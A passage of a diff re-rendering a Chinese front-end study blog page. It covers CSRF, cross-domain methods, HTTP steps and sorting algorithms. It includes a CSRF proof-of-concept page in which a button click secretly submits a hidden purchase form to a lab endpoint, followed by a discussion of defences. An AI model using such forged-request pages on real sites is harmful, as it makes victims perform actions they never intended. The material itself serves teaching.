 //store_into_database($username, $productId);
 ?&gt;
-&lt;meta charset=&quot;utf-8&quot; /&gt;
+&lt;meta charset=&#34;utf-8&#34; /&gt;
 &lt;?php
-echo $username . '买入商品：' . $productId;
+echo $username . &#39;买入商品：&#39; . $productId;
 ?&gt;
-</code></pre><p>黑客代码如下：</p>
-<pre><code>&lt;!DOCYTPE HTML&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>黑客代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;!DOCYTPE HTML&gt;
 &lt;html&gt;
     &lt;head&gt;
-        &lt;meta charset=&quot;utf-8&quot; /&gt;
-        &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt;
+        &lt;meta charset=&#34;utf-8&#34; /&gt;
+        &lt;script src=&#34;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&#34;&gt;&lt;/script&gt;
     &lt;/head&gt;
     &lt;body&gt;
-        &lt;button id=&quot;clickme&quot;&gt;点我看相册&lt;/button&gt;
+        &lt;button id=&#34;clickme&#34;&gt;点我看相册&lt;/button&gt;
         &lt;script&gt;
-            $('#clickme').on('click', function () {
+            $(&#39;#clickme&#39;).on(&#39;click&#39;, function () {
                 // 用户再不知情的情况下，提交了表单，服务器这边也会以为是用户提交过来的。
-                $('#myform').submit();
+                $(&#39;#myform&#39;).submit();
             });
         &lt;/script&gt;
-        &lt;form id=&quot;myform&quot; style=&quot;display:none;&quot; target=&quot;myformer&quot; method=&quot;post&quot; action=&quot;http://myhost:8082/lab/xsrflab/submit.php&quot;&gt;
-            &lt;input type=&quot;hidden&quot; name=&quot;pid&quot; value=&quot;1&quot;&gt;
+        &lt;form id=&#34;myform&#34; style=&#34;display:none;&#34; target=&#34;myformer&#34; method=&#34;post&#34; action=&#34;http://myhost:8082/lab/xsrflab/submit.php&#34;&gt;
+            &lt;input type=&#34;hidden&#34; name=&#34;pid&#34; value=&#34;1&#34;&gt;
         &lt;/form&gt;
-        &lt;iframe name=&quot;myformer&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;
+        &lt;iframe name=&#34;myformer&#34; style=&#34;display:none;&#34;&gt;&lt;/iframe&gt;
     &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p>效果如图</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>效果如图</p>
 <p><img src="https://segmentfault.com/img/bVB9DR" alt="image"></p>
 <p>点击后，用户进行了提交，却连自己都不知情。这种情况如何防御呢？</p>
 <p>最简单的办法就是加验证码，这样除了用户，黑客的网站是获取不到用户本次session的验证码的。但是这样也会降低用户的提交体验，特别是有些经常性的操作，如果总让用户输入验证码，用户也会非常的烦。</p>
@@ -681,8 +775,15 @@ echo $username . '买入商品：' . $productId;
 <p>这种方法其实是JSONP跨域的简化版，JSONP只是在此基础上加入了回调函数。</p>
 <h3 id="access-control">Access Control</h3>
 <p>此跨域方法目前只在很少的浏览器中得以支持，这些浏览器可以发送一个跨域的HTTP请求（Firefox, Google Chrome等通过XMLHTTPRequest实现，IE8下通过XDomainRequest实现），请求的响应必须包含一个Access- Control-Allow-Origin的HTTP响应头，该响应头声明了请求域的可访问权限。例如baidu.com对google.com下的getUsers.php发送了一个跨域的HTTP请求（通过ajax），那么getUsers.php必须加入如下的响应头：</p>
-<pre><code>header(&quot;Access-Control-Allow-Origin: http://www.baidu.com&quot;);//表示允许baidu.com跨域请求本文件
-</code></pre><h3 id="windowname">window.name</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">header(&#34;Access-Control-Allow-Origin: http://www.baidu.com&#34;);//表示允许baidu.com跨域请求本文件
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="windowname">window.name</h3>
 <p>window 对象的name属性是一个很特别的属性，当该window的location变化，然后重新加载，它的name属性可以依然保持不变。那么我们可以在页面 A中用iframe加载其他域的页面B，而页面B中用JavaScript把需要传递的数据赋值给window.name，iframe加载完成之后（iframe.onload），页面A修改iframe的地址，将其变成同域的一个地址，然后就可以读出iframe的window.name的值了（因为A中的window.name和iframe中的window.name互相独立的，所以不能直接在A中获取window.name，而要通过iframe获取其window.name）。这个方式非常适合单向的数据请求，而且协议简单、安全。不会像JSONP那样不做限制地执行外部脚本。</p>
 <h3 id="服务器代理">服务器代理</h3>
 <p>在数据提供方没有提供对JSONP协议或者 window.name协议的支持，也没有对其它域开放访问权限时，我们可以通过server proxy的方式来抓取数据。例如当baidu.com域下的页面需要请求google.com下的资源文件getUsers.php时，直接发送一个指向 google.com/getUsers.php的Ajax请求肯定是会被浏览器阻止。这时，我们在baidu.com下配一个代理，然后把Ajax请求绑定到这个代理路径下，例如baidu.com/proxy/, 然后这个代理发送HTTP请求访问google.com下的getUsers.php，跨域的HTTP请求是在服务器端进行的（服务器端没有同源策略限制），客户端并没有产生跨域的Ajax请求。这个跨域方式不需要和目标资源签订协议，带有侵略性。</p>
@@ -696,32 +797,63 @@ echo $username . '买入商品：' . $productId;
 <h3 id="使用html5的postmessage方法两个iframe之间或者两个页面之间">使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）</h3>
 <p>高级浏览器Internet Explorer 8+, chrome，Firefox , Opera  和 Safari 都将支持这个功能。这个功能主要包括接受信息的&quot;message&quot;事件和发送消息的&quot;postMessage&quot;方法。比如baidu.com域的A页面通过iframe嵌入了一个google.com域的B页面，可以通过以下方法实现A和B的通信</p>
 <p>A页面通过postMessage方法发送消息：</p>
-<pre><code>window.onload = function() {  
-    var ifr = document.getElementById('ifr');  
-    var targetOrigin = &quot;http://www.google.com&quot;;  
-    ifr.contentWindow.postMessage('hello world!', targetOrigin);  
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">window.onload = function() {  
+    var ifr = document.getElementById(&#39;ifr&#39;);  
+    var targetOrigin = &#34;http://www.google.com&#34;;  
+    ifr.contentWindow.postMessage(&#39;hello world!&#39;, targetOrigin);  
 };
-</code></pre><p>postMessage的使用方法：</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>postMessage的使用方法：</p>
 <p>otherWindow.postMessage(message, targetOrigin);</p>
 <p>otherWindow:   指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口
 message:   是要发送的消息，类型为 String、Object (IE8、9 不支持)
 targetOrigin:   是限定消息接收范围，不限制请使用 &lsquo;*&rsquo;</p>
 <p>B页面通过message事件监听并接受消息:</p>
-<pre><code>var onmessage = function (event) {  
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">var onmessage = function (event) {  
   var data = event.data;//消息  
   var origin = event.origin;//消息来源地址  
   var source = event.source;//源Window对象  
-  if(origin==&quot;http://www.baidu.com&quot;){  
+  if(origin==&#34;http://www.baidu.com&#34;){  
 console.log(data);//hello world!  
   }  
 };  
-if (typeof window.addEventListener != 'undefined') {  
-  window.addEventListener('message', onmessage, false);  
-} else if (typeof window.attachEvent != 'undefined') {  
+if (typeof window.addEventListener != &#39;undefined&#39;) {  
+  window.addEventListener(&#39;message&#39;, onmessage, false);  
+} else if (typeof window.attachEvent != &#39;undefined&#39;) {  
   //for ie  
-  window.attachEvent('onmessage', onmessage);  
+  window.attachEvent(&#39;onmessage&#39;, onmessage);  
 }
-</code></pre><h2 id="3一次完整的http事务是怎样的一个过程">==3.一次完整的HTTP事务是怎样的一个过程？==</h2>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="3一次完整的http事务是怎样的一个过程">==3.一次完整的HTTP事务是怎样的一个过程？==</h2>
 <p>基本流程：
 a. 域名解析
 b. 发起TCP的3次握手
@@ -733,391 +865,391 @@ f. 浏览器对页面进行渲染呈现给用户</p>
 <p><img src="http://oe51jhwvd.bkt.clouddn.com/1.png" alt="image"></p>
 <h3 id="冒泡排序">冒泡排序</h3>
 <p>两两比较，若反则交换位置</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> bubbleSort(arr) {
-    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length;
-    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span>; i <span style="color:#000;font-weight:bold">&lt;</span> len; i<span style="color:#000;font-weight:bold">++</span>) {
-        <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> j <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span>; j <span style="color:#000;font-weight:bold">&lt;</span> len <span style="color:#000;font-weight:bold">-</span> <span style="color:#099">1</span> <span style="color:#000;font-weight:bold">-</span> i; j<span style="color:#000;font-weight:bold">++</span>) {
-            <span style="color:#000;font-weight:bold">if</span> (arr[j] <span style="color:#000;font-weight:bold">&gt;</span> arr[j<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>]) {        <span style="color:#998;font-style:italic">//相邻元素两两对比
-</span><span style="color:#998;font-style:italic"></span>                <span style="color:#000;font-weight:bold">var</span> temp <span style="color:#000;font-weight:bold">=</span> arr[j<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>];        <span style="color:#998;font-style:italic">//元素交换
-</span><span style="color:#998;font-style:italic"></span>                arr[j<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>] <span style="color:#000;font-weight:bold">=</span> arr[j];
-                arr[j] <span style="color:#000;font-weight:bold">=</span> temp;
-            }
-        }
-    }
-    <span style="color:#000;font-weight:bold">return</span> arr;
-}
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">bubbleSort</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">len</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="nx">i</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span> <span class="p">{</span>        <span class="c1">//相邻元素两两对比
+</span><span class="c1"></span>                <span class="kd">var</span> <span class="nx">temp</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>        <span class="c1">//元素交换
+</span><span class="c1"></span>                <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="p">];</span>
+                <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span> <span class="o">=</span> <span class="nx">temp</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="选择排序">选择排序</h3>
 <p>每次都找最小的数</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> selectionSort(arr) {
-    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length;
-    <span style="color:#000;font-weight:bold">var</span> minIndex, temp;
-    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span>; i <span style="color:#000;font-weight:bold">&lt;</span> len <span style="color:#000;font-weight:bold">-</span> <span style="color:#099">1</span>; i<span style="color:#000;font-weight:bold">++</span>) {
-        minIndex <span style="color:#000;font-weight:bold">=</span> i;
-        <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> j <span style="color:#000;font-weight:bold">=</span> i <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>; j <span style="color:#000;font-weight:bold">&lt;</span> len; j<span style="color:#000;font-weight:bold">++</span>) {
-            <span style="color:#000;font-weight:bold">if</span> (arr[j] <span style="color:#000;font-weight:bold">&lt;</span> arr[minIndex]) {     <span style="color:#998;font-style:italic">//寻找最小的数
-</span><span style="color:#998;font-style:italic"></span>                minIndex <span style="color:#000;font-weight:bold">=</span> j;                 <span style="color:#998;font-style:italic">//将最小数的索引保存
-</span><span style="color:#998;font-style:italic"></span>            }
-        }
-        temp <span style="color:#000;font-weight:bold">=</span> arr[i];
-        arr[i] <span style="color:#000;font-weight:bold">=</span> arr[minIndex];
-        arr[minIndex] <span style="color:#000;font-weight:bold">=</span> temp;
-    }
-    <span style="color:#000;font-weight:bold">return</span> arr;
-}
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">selectionSort</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">minIndex</span><span class="p">,</span> <span class="nx">temp</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">minIndex</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">minIndex</span><span class="p">])</span> <span class="p">{</span>     <span class="c1">//寻找最小的数
+</span><span class="c1"></span>                <span class="nx">minIndex</span> <span class="o">=</span> <span class="nx">j</span><span class="p">;</span>                 <span class="c1">//将最小数的索引保存
+</span><span class="c1"></span>            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="nx">temp</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+        <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">minIndex</span><span class="p">];</span>
+        <span class="nx">arr</span><span class="p">[</span><span class="nx">minIndex</span><span class="p">]</span> <span class="o">=</span> <span class="nx">temp</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="插入排序">插入排序</h3>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> insertionSort(arr) {
-    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length;
-    <span style="color:#000;font-weight:bold">var</span> preIndex, current;
-    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">1</span>; i <span style="color:#000;font-weight:bold">&lt;</span> len; i<span style="color:#000;font-weight:bold">++</span>) {
-        preIndex <span style="color:#000;font-weight:bold">=</span> i <span style="color:#000;font-weight:bold">-</span> <span style="color:#099">1</span>;
-        current <span style="color:#000;font-weight:bold">=</span> arr[i];
-        <span style="color:#000;font-weight:bold">while</span>(preIndex <span style="color:#000;font-weight:bold">&gt;=</span> <span style="color:#099">0</span> <span style="color:#000;font-weight:bold">&amp;&amp;</span> arr[preIndex] <span style="color:#000;font-weight:bold">&gt;</span> current) {
-            arr[preIndex<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>] <span style="color:#000;font-weight:bold">=</span> arr[preIndex];
-            preIndex<span style="color:#000;font-weight:bold">--</span>;
-        }
-        arr[preIndex<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>] <span style="color:#000;font-weight:bold">=</span> current;
-    }
-    <span style="color:#000;font-weight:bold">return</span> arr;
-}
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">insertionSort</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">preIndex</span><span class="p">,</span> <span class="nx">current</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">preIndex</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="nx">current</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+        <span class="k">while</span><span class="p">(</span><span class="nx">preIndex</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">preIndex</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nx">current</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">arr</span><span class="p">[</span><span class="nx">preIndex</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">preIndex</span><span class="p">];</span>
+            <span class="nx">preIndex</span><span class="o">--</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nx">arr</span><span class="p">[</span><span class="nx">preIndex</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">current</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="希尔排序">希尔排序</h3>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
